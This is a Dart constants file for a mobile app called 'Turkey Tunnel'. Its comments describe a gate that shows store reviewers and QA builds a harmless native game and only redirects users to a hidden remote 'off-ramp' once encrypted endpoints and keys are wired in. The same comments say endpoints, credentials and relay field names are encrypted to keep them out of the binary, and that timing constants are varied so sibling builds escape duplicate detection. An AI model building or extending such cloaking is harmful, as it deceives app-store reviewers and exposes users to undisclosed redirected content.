import 'stowed_bytes.dart';

// ============================================================
// JUNCTION ENV — single source of truth for off-ramp constants
// ============================================================
// Public identity stays as plain constants (the store listing makes
// it public anyway). Everything credential-ish resolves lazily
// through the `pull*` accessors in stowed_bytes.dart, so no plaintext
// endpoint / key / UA token is ever interned into the binary.
//
// Timing constants are tuned off the template's values by >10% so two
// sibling builds never share a magic number.
// ============================================================

abstract final class JunctionEnv {
  // ── Identity (public) ──────────────────────────────────────
  static const String applicationId = 'tr.turkeytunnel.lo';
  static const String marketId = 'tr.turkeytunnel.lo';
  static const String displayName = 'Turkey Tunnel';

  /// iOS numeric id; empty on Android-only builds. `storeTag` prefixes
  /// a non-empty value with `id`, matching the backend contract.
  static const String storeNumericId = '';

  static String get storeTag =>
      storeNumericId.isEmpty ? marketId : 'id$storeNumericId';

  // ── Edge envelope wire shape ───────────────────────────────
  // Field names + schema revision MUST match the deployed relay
  // (scripts/relay_service.py FIELD_* / SCHEMA_REV). They now resolve
  // from the native guard (encrypted) like every other gray-part
  // value, so no wire-shape literal is interned into the binary.
  static int get envelopeRev => pullEnvelopeRev();
  static String get fieldSchema => pullFieldSchema();
  static String get fieldNonce => pullFieldNonce();
  static String get fieldPayload => pullFieldPayload();
  static String get fieldTag => pullFieldTag();

  // ── Timings ────────────────────────────────────────────────
  // Every gray-part constant is encrypted in the guard (native/burrow)
  // and read on demand; the fallbacks only apply in unwired QA builds.
  static int get optinSnoozeSeconds => pullOptinSnoozeSeconds();
  static int get organicRescueDelay => pullOrganicRescueDelay();
  static int get decisionTimeoutSeconds => pullDecisionTimeoutSeconds();
  static int get firstInstallWaitSeconds => pullFirstInstallWaitSeconds();
  static int get returningInstallWaitSeconds =>
      pullReturningInstallWaitSeconds();
  static int get deepLinkWaitSeconds => pullDeepLinkWaitSeconds();
  static int get reachTimeoutSeconds => pullReachTimeoutSeconds();
  static int get reachDropDebounceMs => pullReachDropDebounceMs();
  static int get redirectLoopRetries => pullRedirectLoopRetries();
  static int get cachedUrlTtlSeconds => pullCachedUrlTtlSeconds();
  static int get nativeRetryGapSeconds => pullNativeRetryGapSeconds();

  // ── Resolved (hidden) endpoints & credentials ──────────────
  static String get syncUrl => pullSyncUrl();
  static String get sealKey => pullSealKey();
  static String get trackKey => pullTrackKey();
  static String get fcmProject => pullFcmProject();

  /// The gate only engages once the endpoint, the attribution key and
  /// the Firebase number are all present. Until then every install
  /// lands in the native game — that is deliberate: the build is QA-
  /// and store-safe with no manager credentials.
  static bool get gateArmed =>
      syncUrl.isNotEmpty &&
      sealKey.isNotEmpty &&
      trackKey.isNotEmpty &&
      fcmProject.isNotEmpty;
}
